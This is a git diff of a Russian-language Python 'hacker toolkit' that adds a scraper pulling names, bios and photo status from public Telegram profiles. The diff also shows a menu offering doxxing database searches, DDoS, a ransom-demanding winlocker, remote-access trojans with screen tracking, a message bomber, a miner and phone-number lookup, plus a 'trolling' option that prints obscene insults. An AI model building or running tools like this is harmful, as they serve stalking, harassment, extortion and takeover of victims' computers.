@@ -1,4 +1,29 @@
 from colorama import init, Fore, Style
+from telethon import TelegramClient
+import requests
+from bs4 import BeautifulSoup
+
+def get_public_tg_info(username: str):
+    url = f"https://t.me/{username}"
+    resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
+    if resp.status_code == 404:
+        print("❌ Пользователь не найден (404).")
+        return
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+
+    title = soup.find("meta", property="og:title")
+    full_name = title["content"] if title else "Не указано"
+
+    desc = soup.find("meta", property="og:description")
+    bio = desc["content"] if desc else "Нет биографии"
+
+    has_photo = bool(soup.find("img", class_="tgme_page_photo_image"))
+
+    print(f"[+] Юзернейм: @{username}")
+    print(f"[+] Полное имя: {full_name}")
+    print(f"[+] Био: {bio}")
+    print(f"[+] Фото профиля: {'Есть' if has_photo else 'Отсутствует'}")
 
 def format_result(data: str):
     print(data)
@@ -96,15 +121,15 @@ print(Fore.GREEN + """
 print(Fore.GREEN + """
                                        функционал:
  _____________________________________________________________________________________________________
-| [1] - осинт    [2] - бд поиск(слабый)    [3] - Ddos    [4] - винлокер с откупом   [5] - рат с запуск|
+| [1] - осинт    [2] - бд поиск    [3] - Ddos    [4] - винлокер с откупом   [5] - рат с запуском      |
 | приложений   [6] - рат без запуска приложений, но с отслеживанием экрана                            |
 | [7] - информация о себе   [8] - vpn   [9] - информация о инструменте   [10] - бомбер сообщениями    |
 | [11] - установить библиотеку если через pip install не получается   [12] - майнер   [13] -          |
 | cоздать окно   [14] - windows cmd(например если у вас линукс)   [15] - поиск по номеру  [16] -      |
-| троллинг   [17] - выход                                                                             |
+| троллинг   [17] - поиск по тг   [18] - выход                                                        |
 |_____________________________________________________________________________________________________|
       """)
-num = input("[?] введите номер функции: ")
+num = input("[?] введите номер функции: ") 
 if num == "1":
     import webbrowser
     print(Fore.GREEN + """
@@ -133,6 +158,7 @@ if num == "1":
 elif num == "2":
     import sqlite3
     import time
+    print("в коде замените данные на вашу бд(путь, столбец и т.д)")
     conn = sqlite3.connect(r"C:\Users\User\Downloads\doxkit.db")
     cursor = conn.cursor()
 
@@ -710,8 +736,8 @@ elif num == "14":
     import os
     os.system('cmd')
 elif num == "17":
-    import sys
-    sys.exit()
+    usr = input("Введите Telegram‑юзернейм (без @): ").strip().lstrip("@")
+    get_public_tg_info(usr)
 elif num == "15":
     import time
     phone_number = input("введите номер телефона: ")
@@ -724,5 +750,8 @@ elif num == "16":
     print("ты мразота тупая будешь впитывать мои оскорбления как твоя мать еду с холодильника блять пидр ты ебучий у которого семьи нету олух")
     time.sleep(10)
     print
+elif num == "18":
+    import sys
+    sys.exit()
 else:
     print("[?]не известная команда!") 
